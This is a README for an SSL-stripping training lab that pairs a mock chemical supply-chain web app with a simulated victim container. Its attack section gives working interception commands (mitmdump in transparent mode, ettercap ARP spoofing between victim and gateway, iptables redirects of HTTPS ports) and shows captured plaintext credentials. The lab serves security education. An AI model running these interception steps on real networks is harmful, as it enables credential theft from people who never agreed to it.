# BlueLedger - SSL Stripping Lab Environment

A comprehensive SSL stripping laboratory with automated victim simulation and network discovery for cybersecurity education and defensive research.

## 🎯 Two Usage Modes (Docker or Podman)

### 🔓 **SSL Stripping Lab Mode (Default)**
```bash
docker-compose up --build
```

### 🌐 **Simple Application Mode**
```bash
docker-compose -f docker-compose-simple.yml up --build
```

### 🐋 **Using with Podman Instead of Docker**
```bash
# SSL Stripping Lab Mode (native Podman script)
./run-podman.sh

# Simple Application Mode (requires podman-compose or manual setup)
# Note: Complex networking works better with native Podman commands
```

**Requirements for Podman:**
- `podman` - Container engine
- `iproute2` - Network tools (ip command)  
- `gawk` - Text processing
- **Root or rootless with subuids configured**

## 🚀 SSL Stripping Lab Quick Start

**One command starts everything:**
```bash
# Interactive mode
docker-compose up --build

# Detached mode (runs in background, still shows IPs automatically)
docker-compose up --build -d

# For Podman: Enable socket first, then use same commands!
```

**Automatic magic:**
1. 🌐 Network auto-detection and DHCP configuration
2. 🖥️  Ubuntu server gets real IP and runs BlueLedger
3. 🎭 Debian victim gets real IP and attacks the server
4. 📡 Container IPs displayed automatically with attack commands
5. 🔓 Ready for SSL stripping attacks!

## 🎭 What You Get

### **BlueLedger Server Container**
- **Real DHCP IP** from your router (e.g., 192.168.1.248)
- **Full BlueLedger website** running automatically
- **HTTPS on port 5001** with self-signed certificates
- **Appears as separate device** on your network

### **SSL Victim Container**
- **Real DHCP IP** from your router (e.g., 192.168.1.249)
- **Auto-discovers server** via network scanning
- **Realistic login attempts** every 30 seconds
- **Credentials**: Employee@sinamoa.com / Employee123!@#

## 🔓 Performing SSL Stripping Attacks

Once containers are running with real IPs, perform SSL stripping:

### **Method 1: MITMdump (Recommended)**
```bash
# Find container IPs
docker ps --format "table {{.Names}}\t{{.Networks}}"

# Terminal 1: Start traffic capture
sudo mitmdump --mode transparent --ssl-insecure --showhost --set flow_detail=3

# Terminal 2: ARP spoof the victim
sudo ettercap -T -M arp:remote /[VICTIM_IP]// /[GATEWAY_IP]//

# Terminal 3: Redirect HTTPS traffic
sudo iptables -t nat -A PREROUTING -s [VICTIM_IP] -p tcp --dport 443 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -s [VICTIM_IP] -p tcp --dport 5001 -j REDIRECT --to-port 8080
```

### **Expected Results**
- **Victim logs**: Shows 200 responses (login appears successful)
- **MITMdump**: Shows "TLS handshake failed" then plaintext credentials
- **Captured data**: `{"email":"Employee@sinamoa.com","password":"Employee123!@#"}`

**📚 Complete SSL stripping guide**: See `ssl-stripping-lab/SSL_Stripping_Lab_Guide_NEW.md`

---

# 📁 Repository Structure

```
BlueLedger/
├── 🔓 ssl-stripping-lab/          # SSL Stripping Laboratory
│   ├── containers/                # Container definitions
│   │   └── server_victim/         # Ubuntu server + Debian victim
│   ├── scripts/                   # Lab utility scripts
│   ├── SSL_Stripping_Lab_Guide_NEW.md  # Complete lab guide
│   └── victim_simulator.py       # Victim traffic simulator
│
├── 🏢 blueledger-app/            # BlueLedger Web Application
│   ├── backend/                   # Node.js API server
│   ├── frontend/                  # React.js web interface
│   ├── database/                  # MongoDB initialization
│   ├── deploy/                    # Kubernetes/deployment configs
│   └── scripts/                   # Application utility scripts
│
├── docker-compose.yml             # SSL stripping lab (default)
├── docker-compose-simple.yml     # Simple app mode
├── show-ips.sh                    # Manual IP display
└── README.md                      # This file
```

---

# 🏢 BlueLedger Application Features

A comprehensive web application for managing chemical supply chain operations, customer relationships, and business analytics for Synthalon - an advanced chemical used in biomedical applications.

## ✨ Features

### 🔐 Security & Authentication
- **JWT-based Authentication**: Secure login with JSON Web Tokens
- **Password Hashing**: bcrypt/Argon2 encryption for password security
- **Role-Based Access Control**: Admin, Manager, and Employee access levels
- **Session Management**: Secure user sessions with automatic logout
- **Input Validation**: Comprehensive data validation and sanitization

### 🏢 Business Management
- **CRM System**: Complete customer relationship management
- **Shipments Tracking**: Real-time import/export tracking
- **Contract Management**: Lifecycle management with renewals
- **Analytics Dashboard**: Business metrics and reporting
- **Admin Panel**: User management and system configuration

### 💼 Technical Features
- **RESTful API**: Clean, documented API endpoints
- **Real-time Updates**: WebSocket integration for live data
- **Mobile Responsive**: Optimized for all device sizes
- **Data Export**: PDF and Excel export capabilities
- **Audit Logging**: Complete activity tracking

## 🗄️ Database Schema

### Core Entities
- **Users**: Authentication and role management
- **Customers**: Client information and contact details
- **Shipments**: Import/export tracking and documentation
- **Contracts**: Agreement lifecycle management
- **Analytics**: Business intelligence and reporting data

### Relationships
- Users can manage multiple customers and contracts
- Shipments are linked to specific customers and contracts
- Analytics aggregate data across all entities

## 🛠️ Tech Stack

### Backend
- **Runtime**: Node.js 18+ with Express.js framework
- **Database**: MongoDB 7.0 with Mongoose ODM
- **Authentication**: JWT with bcrypt password hashing
- **Validation**: Joi schema validation
- **Security**: Helmet.js, CORS, rate limiting
- **Logging**: Winston with structured logging

### Frontend
- **Framework**: React 18+ with functional components
- **State Management**: React Context API + useReducer
- **Routing**: React Router v6
- **UI Components**: Material-UI (MUI) design system
- **Forms**: Formik with Yup validation
- **HTTP Client**: Axios with interceptors

### DevOps & Deployment
- **Containerization**: Docker with multi-stage builds
- **Orchestration**: Docker Compose, Kubernetes support
- **Reverse Proxy**: Nginx with SSL termination
- **Monitoring**: Health checks and logging
- **Security**: SSL/TLS encryption, security headers

## ⚙️ Configuration

### Environment Variables
```env
# Database
MONGODB_URI=mongodb://admin:password123@mongodb:27017/sinamoa-chemicals

# Authentication
JWT_SECRET=your-super-secure-jwt-secret-key
JWT_EXPIRE=24h
BCRYPT_ROUNDS=12

# Server Configuration
NODE_ENV=production
PORT=5000
HTTPS_PORT=5001
FRONTEND_URL=http://localhost:3000

# Features
SEED_DATABASE=true
RATE_LIMIT_WINDOW_MS=900000
RATE_LIMIT_MAX_REQUESTS=100
```

## 🚀 Development

### Prerequisites
- Node.js 18+
- MongoDB 7.0+
- **Docker & Docker Compose** OR **Podman** (uses same docker-compose files)

### Quick Start

```bash
# Simple application mode
docker-compose -f docker-compose-simple.yml up --build

# SSL stripping lab mode
docker-compose up --build

# For Podman: Enable socket first, then use same commands
# systemctl --user enable --now podman.socket
# export DOCKER_HOST=unix:///run/user/$UID/podman/podman.sock
```

**Development mode (either engine):**
```bash
cd blueledger-app/backend && npm install && npm run dev
cd blueledger-app/frontend && npm install && npm start
```

### Manual Setup
```bash
# Backend
cd blueledger-app/backend
npm install
npm run dev

# Frontend (new terminal)
cd blueledger-app/frontend
npm install
npm start
```

## 📊 API Documentation

### Authentication Endpoints
- `POST /api/auth/login` - User login
- `POST /api/auth/register` - User registration
- `GET /api/auth/me` - Get current user
- `POST /api/auth/logout` - User logout

### Business Endpoints
- `GET /api/crm/customers` - List all customers
- `POST /api/crm/customers` - Create new customer
- `GET /api/shipments` - List shipments with filtering
- `POST /api/contracts` - Create new contract
- `GET /api/analytics/dashboard` - Dashboard metrics

### Admin Endpoints
- `GET /api/admin/users` - User management
- `POST /api/admin/users` - Create user accounts
- `GET /api/admin/system` - System statistics

## 🔒 Security Features

### Application Security
- **Authentication**: JWT tokens with configurable expiration
- **Authorization**: Role-based access control (RBAC)
- **Password Security**: bcrypt hashing with configurable rounds
- **Input Validation**: Server-side validation with Joi schemas
- **Rate Limiting**: Configurable request rate limiting
- **CORS Protection**: Configurable cross-origin resource sharing
- **Security Headers**: Helmet.js security headers
- **SQL Injection Prevention**: MongoDB with parameterized queries

### Network Security
- **HTTPS**: SSL/TLS encryption for all communications
- **Security Headers**: CSP, HSTS, X-Frame-Options
- **Session Security**: Secure cookie configuration
- **API Security**: Request validation and sanitization

## 📈 Monitoring & Logging

### Application Monitoring
- Health check endpoint (`/health`)
- Request logging with Winston
- Error tracking and reporting
- Performance metrics

### Security Monitoring
- Authentication attempt logging
- Failed request tracking
- Suspicious activity detection
- Audit trail maintenance

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add some amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

## 🆘 Support

- 📚 **Documentation**: Complete guides in `ssl-stripping-lab/` directory
- 🐛 **Issues**: Report bugs via GitHub Issues
- 💬 **Discussions**: Community support via GitHub Discussions
- 📧 **Contact**: For security issues, contact the maintainers directly

## 🎓 Educational Use

This repository demonstrates:
- SSL downgrade attack vectors and mitigation strategies
- Automated victim simulation for security testing
- Container networking and isolation techniques
- Real-world web application security implementations
- Defensive security monitoring and logging

Perfect for cybersecurity education, defensive research, and security awareness training.